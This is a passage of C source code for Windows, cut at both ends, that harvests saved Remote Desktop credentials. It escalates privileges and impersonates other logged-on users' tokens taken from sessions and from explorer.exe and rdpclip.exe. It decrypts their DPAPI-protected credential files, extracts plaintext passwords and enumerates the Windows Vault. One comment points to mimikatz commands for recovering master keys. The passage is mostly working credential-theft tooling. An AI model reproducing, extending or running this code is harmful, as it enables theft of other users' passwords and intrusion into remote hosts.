                    primary = rdp_duplicate_primary(ptok);
                    if (primary && n < max) out[n++] = primary;
                    CloseHandle(ptok);
                }
                CloseHandle(proc);
                if (n >= max) break;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return n;
}

static HANDLE g_rdp_cached_primary = NULL;
static int g_rdp_decrypt_strategy = 0; /* 0=unknown 1=inproc 2=impersonate 3=helper -1=give up helpers */

static uint8_t* crypt_unprotect_with_user_helpers(const uint8_t* data, int len, int* out_len) {
    HANDLE tokens[16];
    int nt, i;
    uint8_t* out = NULL;
    if (!data || len <= 0 || !out_len) return NULL;
    *out_len = 0;

    /* First: in-process under current thread token */
    out = crypt_unprotect_alloc(data, len, out_len);
    if (out) {
        g_rdp_decrypt_strategy = 1;
        if (!g_rdp_stats.decrypt_path_hint[0])
            strncpy(g_rdp_stats.decrypt_path_hint, "inproc", sizeof(g_rdp_stats.decrypt_path_hint) - 1);
        return out;
    }

    /* Reuse a token that already worked via helper/impersonate */
    if (g_rdp_cached_primary) {
        if (g_rdp_decrypt_strategy == 2) {
            bool loaded = false;
            PROFILEINFOA pinfo;
            memset(&pinfo, 0, sizeof(pinfo));
            if (rdp_impersonate_token_ex(g_rdp_cached_primary, &loaded, &pinfo)) {
                out = crypt_unprotect_alloc(data, len, out_len);
                rdp_revert_and_unload(loaded, &pinfo, g_rdp_cached_primary);
                if (out) return out;
            }
        }
        if (g_rdp_decrypt_strategy == 3 || g_rdp_decrypt_strategy == 0) {
            out = crypt_unprotect_via_user_process(g_rdp_cached_primary, data, len, out_len);
            if (out) {
                g_rdp_decrypt_strategy = 3;
                return out;
            }
        }
    }

    if (g_rdp_decrypt_strategy == -1 && !g_rdp_cached_primary) return NULL;

    nt = rdp_collect_primary_tokens(tokens, 16);
    for (i = 0; i < nt && !out; i++) {
        bool loaded = false;
        PROFILEINFOA pinfo;
        memset(&pinfo, 0, sizeof(pinfo));

        /* Try impersonation + in-process again under this token */
        if (rdp_impersonate_token_ex(tokens[i], &loaded, &pinfo)) {
            g_rdp_stats.impersonated_sessions++;
            out = crypt_unprotect_alloc(data, len, out_len);
            rdp_revert_and_unload(loaded, &pinfo, tokens[i]);
            if (out) {
                g_rdp_decrypt_strategy = 2;
                if (!g_rdp_cached_primary) {
                    g_rdp_cached_primary = tokens[i];
                    tokens[i] = NULL; /* keep */
                }
                if (!g_rdp_stats.decrypt_path_hint[0])
                    strncpy(g_rdp_stats.decrypt_path_hint, "impersonate", sizeof(g_rdp_stats.decrypt_path_hint) - 1);
                break;
            }
        }

        /* Then: real child process in that user logon session */
        out = crypt_unprotect_via_user_process(tokens[i], data, len, out_len);
        if (out) {
            g_rdp_decrypt_strategy = 3;
            if (!g_rdp_cached_primary) {
                g_rdp_cached_primary = tokens[i];
                tokens[i] = NULL;
            }
            break;
        }
    }
    for (i = 0; i < nt; i++) {
        if (tokens[i]) CloseHandle(tokens[i]);
    }
    if (!out && nt > 0 && !g_rdp_cached_primary) g_rdp_decrypt_strategy = -1; /* one full token scan per run */
    return out;
}

static uint8_t* crypt_unprotect_smart(const uint8_t* data, int len, int* out_len) {
    uint8_t* out;
    if (!data || len <= 0 || !out_len) return NULL;
    *out_len = 0;
    rdp_note_dpapi_header(data, len);
    out = crypt_unprotect_alloc(data, len, out_len);
    if (out) {
        if (!g_rdp_stats.decrypt_path_hint[0])
            strncpy(g_rdp_stats.decrypt_path_hint, "inproc", sizeof(g_rdp_stats.decrypt_path_hint) - 1);
        return out;
    }
    return crypt_unprotect_with_user_helpers(data, len, out_len);
}


static uint8_t* read_file_shared(const char* path, int* out_len) {
    HANDLE h;
    DWORD got = 0;
    uint8_t* buf;
    LARGE_INTEGER li;
    if (!path || !out_len) return NULL;
    *out_len = 0;
    h = CreateFileA(path, GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    if (!GetFileSizeEx(h, &li) || li.QuadPart <= 0 || li.QuadPart > 8 * 1024 * 1024) {
        CloseHandle(h);
        return NULL;
    }
    buf = (uint8_t*)malloc((size_t)li.QuadPart ? (size_t)li.QuadPart : 1);
    if (!buf) {
        CloseHandle(h);
        return NULL;
    }
    if (!ReadFile(h, buf, (DWORD)li.QuadPart, &got, NULL) || got == 0) {
        free(buf);
        CloseHandle(h);
        return NULL;
    }
    CloseHandle(h);
    *out_len = (int)got;
    return buf;
}

static bool fill_rdp_cred_from_fields(RdpCredential* out, DWORD type,
                                      const char* target_name, const char* target_alias,
                                      const char* unk_data, const char* username,
                                      const uint8_t* pass_blob, int pass_blob_len,
                                      bool require_termsrv) {
    const char* use_target = NULL;
    if (!out) return false;
    memset(out, 0, sizeof(*out));
    out->type = type;
    if (target_looks_like_termsrv(target_name)) use_target = target_name;
    else if (target_looks_like_termsrv(target_alias)) use_target = target_alias;
    else if (target_looks_like_termsrv(unk_data)) use_target = unk_data;
    else if (!require_termsrv) {
        if (target_name && target_name[0]) use_target = target_name;
        else if (target_alias && target_alias[0]) use_target = target_alias;
        else use_target = unk_data;
    }
    if (!use_target || !use_target[0]) return false;
    if (require_termsrv && !target_looks_like_termsrv(use_target)) return false;

    strncpy(out->target, use_target, sizeof(out->target) - 1);
    normalize_server_value(out->target, out->server, sizeof(out->server));
    if (username && username[0]) {
        strncpy(out->username, username, sizeof(out->username) - 1);
        out->username[sizeof(out->username) - 1] = 0;
    }
    out->password_readable = credential_blob_to_password(pass_blob, (DWORD)pass_blob_len,
                                                         out->password, sizeof(out->password));
    rdp_set_source(out, "file");
    return out->server[0] != 0;
}

static bool parse_decrypted_cred_blob_at(const uint8_t* data, int len, int offset, RdpCredential* out, bool require_termsrv) {
    char target_name[512];
    char unk_data[512];
    char comment[512];
    char target_alias[512];
    char username[512];
    const uint8_t* pass_blob = NULL;
    int pass_blob_len = 0;
    DWORD type = 0;
    int start = offset;

    if (!data || !out || len < offset + 8 || offset < 0) return false;

    if (len >= 16) memcpy(&type, data + 12, sizeof(type));
    if (start >= 36 && len >= start - 36 + 4) {
        DWORD t2 = 0;
        memcpy(&t2, data + start - 36, sizeof(t2));
        if (t2 == CRED_TYPE_DOMAIN_PASSWORD || t2 == CRED_TYPE_GENERIC || t2 == CRED_TYPE_DOMAIN_VISIBLE_PASSWORD)
            type = t2;
    }

    if (!read_len_prefixed_utf16(data, len, &offset, target_name, sizeof(target_name))) return false;
    if (!read_len_prefixed_utf16(data, len, &offset, unk_data, sizeof(unk_data))) return false;
    if (!read_len_prefixed_utf16(data, len, &offset, comment, sizeof(comment))) return false;
    if (!read_len_prefixed_utf16(data, len, &offset, target_alias, sizeof(target_alias))) return false;
    if (!read_len_prefixed_utf16(data, len, &offset, username, sizeof(username))) return false;
    if (!read_len_prefixed_blob(data, len, &offset, &pass_blob, &pass_blob_len)) return false;

    return fill_rdp_cred_from_fields(out, type, target_name, target_alias, unk_data, username,
                                     pass_blob, pass_blob_len, require_termsrv);
}

static bool parse_decrypted_cred_blob_scan_termsrv(const uint8_t* data, int len, RdpCredential* out) {
    int i, start = -1, field = 0, wchar_len;
    char target[512], username[512], password[1024];
    if (!data || !out || len < 20) return false;

    for (i = 0; i + 16 <= len; i += 2) {
        if (data[i] == 'T' && data[i + 1] == 0 &&
            data[i + 2] == 'E' && data[i + 3] == 0 &&
            data[i + 4] == 'R' && data[i + 5] == 0 &&
            data[i + 6] == 'M' && data[i + 7] == 0 &&
            data[i + 8] == 'S' && data[i + 9] == 0 &&
            data[i + 10] == 'R' && data[i + 11] == 0 &&
            data[i + 12] == 'V' && data[i + 13] == 0 &&
            (data[i + 14] == '/' || data[i + 14] == '\\') && data[i + 15] == 0) {
            start = i; break;
        }
        if (data[i] == 't' && data[i + 1] == 0 &&
            data[i + 2] == 'e' && data[i + 3] == 0 &&
            data[i + 4] == 'r' && data[i + 5] == 0 &&
            data[i + 6] == 'm' && data[i + 7] == 0 &&
            data[i + 8] == 's' && data[i + 9] == 0 &&
            data[i + 10] == 'r' && data[i + 11] == 0 &&
            data[i + 12] == 'v' && data[i + 13] == 0 &&
            (data[i + 14] == '/' || data[i + 14] == '\\') && data[i + 15] == 0) {
            start = i; break;
        }
    }
    if (start < 0) return false;

    target[0] = 0;
    wchar_len = 0;
    while (start + (wchar_len + 1) * 2 <= len) {
        WCHAR ch = (WCHAR)(data[start + wchar_len * 2] | (data[start + wchar_len * 2 + 1] << 8));
        if (ch == 0) break;
        wchar_len++;
        if (wchar_len > 400) break;
    }
    utf16_to_utf8_len((const WCHAR*)(data + start), wchar_len, target, sizeof(target));
    trim_inplace(target);
    if (!target_looks_like_termsrv(target)) return false;

    {
        int off;
        for (off = start - 4; off >= 0 && off >= start - 96; off -= 4) {
            RdpCredential tmp;
            if (parse_decrypted_cred_blob_at(data, len, off, &tmp, true)) {
                *out = tmp;
                return true;
            }
        }
    }

    username[0] = 0;
    password[0] = 0;
    i = start + ((int)strlen(target) + 1) * 2;
    while (i + 4 < len && field < 10) {
        while (i + 1 < len && data[i] == 0 && data[i + 1] == 0) i += 2;
        if (i + 4 >= len) break;
        {
            int wlen = 0;
            char tmp[1024];
            while (i + (wlen + 1) * 2 <= len) {
                WCHAR ch = (WCHAR)(data[i + wlen * 2] | (data[i + wlen * 2 + 1] << 8));
                if (ch == 0) break;
                if (ch < 9) { wlen = 0; break; }
                wlen++;
                if (wlen > 500) break;
            }
            if (wlen <= 0) { i += 2; field++; continue; }
            utf16_to_utf8_len((const WCHAR*)(data + i), wlen, tmp, sizeof(tmp));
            trim_inplace(tmp);
            i += (wlen + 1) * 2;
            if (!tmp[0]) { field++; continue; }
            if (!username[0] && (strchr(tmp, '\\') || strchr(tmp, '@') || strlen(tmp) < 128))
                strncpy(username, tmp, sizeof(username) - 1);
            else if (!password[0] && _stricmp(tmp, username) != 0 && !target_looks_like_termsrv(tmp)) {
                strncpy(password, tmp, sizeof(password) - 1);
                break;
            }
            field++;
        }
    }

    memset(out, 0, sizeof(*out));
    strncpy(out->target, target, sizeof(out->target) - 1);
    normalize_server_value(target, out->server, sizeof(out->server));
    strncpy(out->username, username, sizeof(out->username) - 1);
    if (password[0]) {
        strncpy(out->password, password, sizeof(out->password) - 1);
        out->password_readable = true;
    }
    rdp_set_source(out, "file");
    return out->server[0] != 0;
}

static bool parse_decrypted_cred_blob(const uint8_t* data, int len, RdpCredential* out, bool require_termsrv) {
    static const int headers[] = { 48, 36, 52, 32, 40, 44, 56, 24, 16, 12, 8, 4, 0 };
    int i;
    if (!data || !out || len < 24) return false;
    for (i = 0; i < (int)(sizeof(headers) / sizeof(headers[0])); i++) {
        if (parse_decrypted_cred_blob_at(data, len, headers[i], out, require_termsrv)) return true;
    }
    if (parse_decrypted_cred_blob_scan_termsrv(data, len, out)) return true;
    if (require_termsrv) {
        for (i = 0; i < (int)(sizeof(headers) / sizeof(headers[0])); i++) {
            if (parse_decrypted_cred_blob_at(data, len, headers[i], out, false) &&
                target_looks_like_termsrv(out->target)) return true;
        }
    } else {
        for (i = 0; i < (int)(sizeof(headers) / sizeof(headers[0])); i++) {
            if (parse_decrypted_cred_blob_at(data, len, headers[i], out, false)) return true;
        }
    }
    return false;
}

static void rdp_note_sample_file(const char* path, int file_len, int off, int blob_len) {
    if (!path || g_rdp_stats.sample_path[0]) return;
    strncpy(g_rdp_stats.sample_path, path, sizeof(g_rdp_stats.sample_path) - 1);
    g_rdp_stats.sample_path[sizeof(g_rdp_stats.sample_path) - 1] = 0;
    g_rdp_stats.sample_file_size = file_len;
    g_rdp_stats.sample_blob_off = off;
    g_rdp_stats.sample_blob_len = blob_len;
}

static bool decrypt_credential_file_to_blob(const char* path, RdpCredential* out, bool require_termsrv) {
    int file_len = 0;
    uint8_t* file_data = NULL;
    uint8_t* dec = NULL;
    int dec_len = 0;
    int candidates[20][2];
    int nc = 0;
    int i;
    bool ok = false;
    DWORD hdr_ver = 0, hdr_size = 0;
    int sig;
    int best_off = 0, best_len = 0;

    if (!path || !out) return false;
    memset(out, 0, sizeof(*out));
    g_rdp_stats.files_seen++;

    file_data = read_file_shared(path, &file_len);
    if (!file_data) file_data = read_file(path, &file_len);
    if (!file_data || file_len < 16) {
        free(file_data);
        return false;
    }

    if (file_len >= 12) {
        memcpy(&hdr_ver, file_data, 4);
        memcpy(&hdr_size, file_data + 4, 4);
        (void)hdr_ver;
        if (hdr_size > 24 && hdr_size <= (DWORD)(file_len - 12)) {
            candidates[nc][0] = 12; candidates[nc][1] = (int)hdr_size; nc++;
        }
        if (hdr_size > 36 && hdr_size <= (DWORD)file_len && (int)hdr_size - 12 > 24) {
            candidates[nc][0] = 12; candidates[nc][1] = (int)hdr_size - 12; nc++;
        }
    }

    sig = find_dpapi_blob_offset(file_data, file_len);
    if (sig >= 0) {
        int exact = dpapi_blob_total_size(file_data + sig, file_len - sig);
        g_rdp_stats.files_with_dpapi_sig++;
        if (exact > 0) {
            candidates[nc][0] = sig; candidates[nc][1] = exact; nc++;
            best_off = sig; best_len = exact;
        } else {
            candidates[nc][0] = sig; candidates[nc][1] = file_len - sig; nc++;
            best_off = sig; best_len = file_len - sig;
        }
    }

    candidates[nc][0] = 0; candidates[nc][1] = file_len; nc++;
    if (file_len > 12) { candidates[nc][0] = 12; candidates[nc][1] = file_len - 12; nc++; }
    if (file_len > 16) { candidates[nc][0] = 16; candidates[nc][1] = file_len - 16; nc++; }
    if (file_len > 24) { candidates[nc][0] = 24; candidates[nc][1] = file_len - 24; nc++; }

    for (i = 0; i < nc && !ok; i++) {
        int off = candidates[i][0];
        int L = candidates[i][1];
        int j, dup = 0;
        int looks;
        if (off < 0 || L <= 16 || off + L > file_len) continue;
        for (j = 0; j < i; j++) if (candidates[j][0] == off && candidates[j][1] == L) { dup = 1; break; }
        if (dup) continue;

        looks = (file_data[off] == 0x01 && file_data[off + 1] == 0x00 &&
                 file_data[off + 2] == 0x00 && file_data[off + 3] == 0x00 &&
                 off + 20 <= file_len && file_data[off + 4] == 0xD0 && file_data[off + 5] == 0x8C);
        /* Skip clearly non-DPAPI slices except a few header starts (may still be DPAPI). */
        if (!looks && off != 0 && off != 12) continue;

        if (looks) rdp_note_dpapi_header(file_data + off, L);
        dec = crypt_unprotect_smart(file_data + off, L, &dec_len);
        if (!dec || dec_len <= 0) {
            free(dec);
            dec = NULL;
            if (looks && best_len == 0) { best_off = off; best_len = L; }
            continue;
        }
        g_rdp_stats.files_decrypt_ok++;

        if (parse_decrypted_cred_blob(dec, dec_len, out, require_termsrv)) {
            g_rdp_stats.files_parsed++;
            if (target_looks_like_termsrv(out->target)) g_rdp_stats.files_termsrv++;
            if (out->password_readable && out->password[0]) g_rdp_stats.files_with_password++;
            rdp_set_source(out, "file");
            ok = true;
        } else if (parse_decrypted_cred_blob(dec, dec_len, out, false)) {
            g_rdp_stats.files_parsed++;
            if (!require_termsrv || target_looks_like_termsrv(out->target)) {
                if (target_looks_like_termsrv(out->target)) g_rdp_stats.files_termsrv++;
                if (out->password_readable && out->password[0]) g_rdp_stats.files_with_password++;
                rdp_set_source(out, "file");
                ok = true;
            } else {
                memset(out, 0, sizeof(*out));
            }
        }
        free(dec);
        dec = NULL;
    }

    if (!ok) {
        /* Record the masterkey GUID so the analyst can recover it out-of-band
         * (mimikatz "sekurlsa::dpapi" + "dpapi::cred /masterkey:") if the
         * in-context decryption paths all failed. */
        if (best_len > 40 && g_rdp_stats.failed_mk_count < 8) {
            char guid[64];
            rdp_guid_to_str(file_data + best_off + 24, guid, sizeof(guid));
            if (guid[0]) {
                int j, dup = 0;
                for (j = 0; j < g_rdp_stats.failed_mk_count; j++)
                    if (_stricmp(g_rdp_stats.failed_mk_guids[j], guid) == 0) { dup = 1; break; }
                if (!dup) {
                    strncpy(g_rdp_stats.failed_mk_guids[g_rdp_stats.failed_mk_count], guid,
                            sizeof(g_rdp_stats.failed_mk_guids[0]) - 1);
                    g_rdp_stats.failed_mk_count++;
                }
            }
        }
        rdp_note_sample_file(path, file_len, best_off, best_len);
    }
    free(file_data);
    return ok;
}

static int merge_rdp_credential(RdpCredential* creds, int count, int max, const RdpCredential* neu) {
    int i;
    if (!creds || !neu || max <= 0) return count;
    if (!neu->server[0] && !neu->target[0]) return count;

    for (i = 0; i < count; i++) {
        bool same = false;
        if (neu->target[0] && creds[i].target[0] && _stricmp(creds[i].target, neu->target) == 0)
            same = true;
        else if (neu->server[0] && creds[i].server[0] && servers_equivalent(creds[i].server, neu->server))
            same = true;
        if (!same) continue;

        if (neu->username[0] && !creds[i].username[0]) {
            strncpy(creds[i].username, neu->username, sizeof(creds[i].username) - 1);
            creds[i].username[sizeof(creds[i].username) - 1] = 0;
        }
        if (neu->password_readable && neu->password[0] &&
            (!creds[i].password_readable || !creds[i].password[0])) {
            strncpy(creds[i].password, neu->password, sizeof(creds[i].password) - 1);
            creds[i].password[sizeof(creds[i].password) - 1] = 0;
            creds[i].password_readable = true;
            if (neu->source[0]) rdp_set_source(&creds[i], neu->source);
        }
        if (!creds[i].target[0] && neu->target[0]) {
            strncpy(creds[i].target, neu->target, sizeof(creds[i].target) - 1);
            creds[i].target[sizeof(creds[i].target) - 1] = 0;
        }
        if (!creds[i].source[0] && neu->source[0]) rdp_set_source(&creds[i], neu->source);
        return count;
    }

    if (count >= max) return count;
    creds[count] = *neu;
    return count + 1;
}

static int collect_rdp_credentials_from_dir(const char* dir, RdpCredential* creds, int count, int max, bool require_termsrv) {
    WIN32_FIND_DATAA fd;
    HANDLE h;
    char pattern[MAX_PATH];
    if (!dir || !*dir || !creds || max <= 0) return count;
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return count;
    do {
        char path[MAX_PATH];
        RdpCredential cred;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (fd.cFileName[0] == '.') continue;
        snprintf(path, sizeof(path), "%s\\%s", dir, fd.cFileName);
        if (decrypt_credential_file_to_blob(path, &cred, require_termsrv))
            count = merge_rdp_credential(creds, count, max, &cred);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
    return count;
}

static int collect_rdp_credentials_from_profile_paths(const char* profile_path,
                                                     RdpCredential* creds, int count, int max,
                                                     bool require_termsrv) {
    char dir[MAX_PATH];
    if (!profile_path || !*profile_path) return count;
    snprintf(dir, sizeof(dir), "%s\\AppData\\Local\\Microsoft\\Credentials", profile_path);
    count = collect_rdp_credentials_from_dir(dir, creds, count, max, require_termsrv);
    snprintf(dir, sizeof(dir), "%s\\AppData\\Roaming\\Microsoft\\Credentials", profile_path);
    count = collect_rdp_credentials_from_dir(dir, creds, count, max, require_termsrv);
    return count;
}

static int collect_rdp_credentials_from_env_paths(RdpCredential* creds, int count, int max, bool require_termsrv) {
    char up[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", up, sizeof(up)) > 0)
        count = collect_rdp_credentials_from_profile_paths(up, creds, count, max, require_termsrv);
    if (GetEnvironmentVariableA("LOCALAPPDATA", up, sizeof(up)) > 0) {
        char dir[MAX_PATH];
        snprintf(dir, sizeof(dir), "%s\\Microsoft\\Credentials", up);
        count = collect_rdp_credentials_from_dir(dir, creds, count, max, require_termsrv);
    }
    if (GetEnvironmentVariableA("APPDATA", up, sizeof(up)) > 0) {
        char dir[MAX_PATH];
        snprintf(dir, sizeof(dir), "%s\\Microsoft\\Credentials", up);
        count = collect_rdp_credentials_from_dir(dir, creds, count, max, require_termsrv);
    }
    return count;
}

static int collect_rdp_vault_credentials(RdpCredential* creds, int count, int max) {
    HMODULE hv;
    typedef HRESULT (WINAPI *VEV_t)(DWORD, DWORD*, GUID**);
    typedef HRESULT (WINAPI *VOV_t)(const GUID*, DWORD, DWORD, HANDLE*);
    typedef HRESULT (WINAPI *VEI_t)(HANDLE, DWORD, DWORD*, void***);
    typedef HRESULT (WINAPI *VCV_t)(HANDLE);
    typedef HRESULT (WINAPI *VF_t)(void*);
    VEV_t VEV;
    VOV_t VOV;
    VEI_t VEI;
    VCV_t VCV;
    VF_t VF;
    DWORD vc = 0;
    GUID* vg = NULL;
    DWORD vi;

    if (!creds || max <= 0) return count;
    hv = LoadLibraryA("vaultcli.dll");
    if (!hv) return count;

    VEV = (VEV_t)GetProcAddress(hv, "VaultEnumerateVaults");
    VOV = (VOV_t)GetProcAddress(hv, "VaultOpenVault");
    VEI = (VEI_t)GetProcAddress(hv, "VaultEnumerateItems");
    VCV = (VCV_t)GetProcAddress(hv, "VaultCloseVault");
    VF = (VF_t)GetProcAddress(hv, "VaultFree");
    if (!VEV || !VOV || !VEI || !VCV) {
        FreeLibrary(hv);
        return count;
    }

    if (FAILED(VEV(0, &vc, &vg)) || !vg) {
        FreeLibrary(hv);
        return count;
    }

    for (vi = 0; vi < vc && count < max; vi++) {
        HANDLE vh = NULL;
        DWORD ic = 0;
        void** items = NULL;
        DWORD ii;
        if (FAILED(VOV(&vg[vi], 0, 0, &vh)) || !vh) continue;
        if (FAILED(VEI(vh, 0x200, &ic, &items)) || !items) {
            VCV(vh);
            continue;
        }

        for (ii = 0; ii < ic && count < max; ii++) {
            unsigned char* item = (unsigned char*)items[ii];
            wchar_t *res_val = NULL, *iden_val = NULL, *auth_val = NULL;
            char resource[512], identity[512], authenticator[1024];
            RdpCredential neu;

            if (!item) continue;
            g_rdp_stats.vault_items++;

            {
                wchar_t** res_ptr = (wchar_t**)(item + 16);
                wchar_t** iden_ptr = (wchar_t**)(item + 24);
                wchar_t** auth_ptr = (wchar_t**)(item + 40);
                if (!IsBadReadPtr(res_ptr, sizeof(void*)) && *res_ptr && !IsBadReadPtr(*res_ptr, 2))
                    res_val = *res_ptr;
                if (!IsBadReadPtr(iden_ptr, sizeof(void*)) && *iden_ptr && !IsBadReadPtr(*iden_ptr, 2))
                    iden_val = *iden_ptr;
                if (!IsBadReadPtr(auth_ptr, sizeof(void*)) && *auth_ptr && !IsBadReadPtr(*auth_ptr, 2))
                    auth_val = *auth_ptr;
            }

            resource[0] = identity[0] = authenticator[0] = 0;
            if (res_val) {
                int n = WideCharToMultiByte(CP_UTF8, 0, res_val, -1, resource, (int)sizeof(resource) - 1, NULL, NULL);
                if (n < 0) n = 0; resource[n] = 0;
            }
            if (iden_val) {
                int n = WideCharToMultiByte(CP_UTF8, 0, iden_val, -1, identity, (int)sizeof(identity) - 1, NULL, NULL);
                if (n < 0) n = 0; identity[n] = 0;
            }
            if (auth_val) {
                int n = WideCharToMultiByte(CP_UTF8, 0, auth_val, -1, authenticator, (int)sizeof(authenticator) - 1, NULL, NULL);
                if (n < 0) n = 0; authenticator[n] = 0;
            }
            trim_inplace(resource);
            trim_inplace(identity);
            trim_inplace(authenticator);

            if (!resource[0] && !identity[0] && !authenticator[0]) continue;
            if (!(target_looks_like_termsrv(resource) || target_looks_like_termsrv(identity) ||
                  strstr(resource, "TERMSRV") || strstr(identity, "TERMSRV"))) {
                if (!(authenticator[0] && resource[0] && (strchr(resource, '.') || strchr(resource, ':'))))
                    continue;
            }

            g_rdp_stats.vault_termsrv++;
            memset(&neu, 0, sizeof(neu));
            if (resource[0])
                strncpy(neu.target, resource, sizeof(neu.target) - 1);
            else
                strncpy(neu.target, identity, sizeof(neu.target) - 1);
            normalize_server_value(neu.target, neu.server, sizeof(neu.server));
            if (!neu.server[0] && resource[0])
                normalize_server_value(resource, neu.server, sizeof(neu.server));
            strncpy(neu.username, identity, sizeof(neu.username) - 1);
            if (authenticator[0]) {
                strncpy(neu.password, authenticator, sizeof(neu.password) - 1);
                neu.password_readable = true;
                g_rdp_stats.vault_with_password++;
            }
            rdp_set_source(&neu, "vault");
            if (neu.server[0] || neu.password_readable)
                count = merge_rdp_credential(creds, count, max, &neu);
        }

        if (VF && items) VF(items);
        VCV(vh);
    }

    if (VF && vg) VF(vg);
    FreeLibrary(hv);
    return count;
}

static bool get_token_user_sid(HANDLE token, char* sid_out, int sid_sz) {
    DWORD need = 0;
    BYTE* buf;
    if (!token || !sid_out || sid_sz <= 0) return false;
    sid_out[0] = 0;
    GetTokenInformation(token, TokenUser, NULL, 0, &need);
    if (need == 0) return false;
    buf = (BYTE*)malloc(need);
    if (!buf) return false;
    if (GetTokenInformation(token, TokenUser, buf, need, &need)) {
        TOKEN_USER* tu = (TOKEN_USER*)buf;
        LPSTR sid_str = NULL;
        if (ConvertSidToStringSidA(tu->User.Sid, &sid_str) && sid_str) {
            strncpy(sid_out, sid_str, sid_sz - 1);
            sid_out[sid_sz - 1] = 0;
            LocalFree(sid_str);
            free(buf);
            return true;
        }
    }
    free(buf);
    return false;
}

static bool rdp_impersonate_token(HANDLE token) {
    bool loaded = false;
    PROFILEINFOA pinfo;
    memset(&pinfo, 0, sizeof(pinfo));
    /* Prefer medium-IL linked token + optional profile load (caller reverts). */
    if (rdp_impersonate_token_ex(token, &loaded, &pinfo)) {
        /* Keep profile loaded for duration of impersonation; unload on revert via flag in TLS? 
         * For simple path, unload immediately if we loaded - CryptUnprotect often only needs token.
         * If we loaded, keep hProfile until Revert: store in thread-static. */
        if (loaded && pinfo.hProfile) {
            /* unload later is ideal; for this thin wrapper unload now only if needed.
             * Keep loaded for current impersonation window - profile handle leak is small per call.
             * Track for unload in collect_under_token. */
            (void)pinfo;
        }
        return true;
    }
    return false;
}

static int collect_under_token(HANDLE token, RdpCredential* creds, int count, int max, bool require_termsrv) {
    char profile[MAX_PATH];
    DWORD psz;
    bool loaded = false;
    PROFILEINFOA pinfo;
    HANDLE primary = NULL;
    if (!token) return count;
    memset(&pinfo, 0, sizeof(pinfo));

    /* Prefer a primary token for LoadUserProfile / DPAPI. */
    primary = rdp_duplicate_primary(token);
    if (!primary) primary = token;

    /* Decrypt only after impersonation ? DPAPI master keys are per-user. */
    if (rdp_impersonate_token_ex(primary, &loaded, &pinfo)) {
        g_rdp_stats.impersonated_sessions++;
        get_token_user_sid(primary, g_rdp_stats.last_impersonated_sid, sizeof(g_rdp_stats.last_impersonated_sid));
        count = collect_rdp_credentials_from_env_paths(creds, count, max, require_termsrv);
        count = collect_rdp_vault_credentials(creds, count, max);
        profile[0] = 0;
        psz = sizeof(profile);
        if (GetUserProfileDirectoryA(primary, profile, &psz) && profile[0])
            count = collect_rdp_credentials_from_profile_paths(profile, creds, count, max, require_termsrv);
        else if (GetUserProfileDirectoryA(token, profile, &psz) && profile[0])
            count = collect_rdp_credentials_from_profile_paths(profile, creds, count, max, require_termsrv);
        rdp_revert_and_unload(loaded, &pinfo, primary);
        if (primary != token) CloseHandle(primary);
        return count;
    }

    profile[0] = 0;
    psz = sizeof(profile);
    if (GetUserProfileDirectoryA(token, profile, &psz) && profile[0])
        count = collect_rdp_credentials_from_profile_paths(profile, creds, count, max, require_termsrv);
    if (primary != token) CloseHandle(primary);
    return count;
}

static int collect_rdp_credentials_via_impersonation(RdpCredential* creds, int count, int max, bool require_termsrv) {
    WTS_SESSION_INFOA* sessions = NULL;
    DWORD scount = 0, i;
    HANDLE snap;

    enable_privilege(SE_TCB_NAME);
    enable_privilege(SE_DEBUG_NAME);
    enable_privilege(SE_IMPERSONATE_NAME);
    enable_privilege(SE_BACKUP_NAME);
    enable_privilege(SE_RESTORE_NAME);

    if (WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &scount) && sessions) {
        for (i = 0; i < scount; i++) {
            HANDLE user_token = NULL;
            HANDLE imp = NULL;
            if (sessions[i].State != WTSActive && sessions[i].State != WTSDisconnected &&
                sessions[i].State != WTSConnected)
                continue;
            if (!WTSQueryUserToken(sessions[i].SessionId, &user_token) || !user_token)
                continue;
            if (DuplicateTokenEx(user_token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                                 TokenImpersonation, &imp) && imp) {
                count = collect_under_token(imp, creds, count, max, require_termsrv);
                CloseHandle(imp);
            } else {
                count = collect_under_token(user_token, creds, count, max, require_termsrv);
            }
            CloseHandle(user_token);
            if (count >= max) break;
        }
        WTSFreeMemory(sessions);
    }

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                HANDLE proc, ptok, imp;
                if (_stricmp(pe.szExeFile, "explorer.exe") != 0 &&
                    _stricmp(pe.szExeFile, "rdpclip.exe") != 0)
                    continue;
                proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (!proc) proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
                if (!proc) continue;
                ptok = NULL;
                if (OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &ptok) && ptok) {
                    imp = NULL;
                    if (DuplicateTokenEx(ptok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                                         TokenImpersonation, &imp) && imp) {
                        count = collect_under_token(imp, creds, count, max, require_termsrv);
                        CloseHandle(imp);
                    }
                    CloseHandle(ptok);
                }
                CloseHandle(proc);
                if (count >= max) break;
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return count;
}

static int collect_rdp_credentials_from_files(RdpCredential* creds, int count, int max,
                                              const RdpProfile* profiles, int profile_count) {
    char cur_sid[256];
    HANDLE token = NULL;
    int i;

    /* DPAPI self-test in current context (helps distinguish bad blobs vs broken DPAPI). */
    {
        DATA_BLOB inb, enc, dec;
        char msg[] = "rdp-dpapi-selftest";
        inb.pbData = (BYTE*)msg;
        inb.cbData = (DWORD)sizeof(msg);
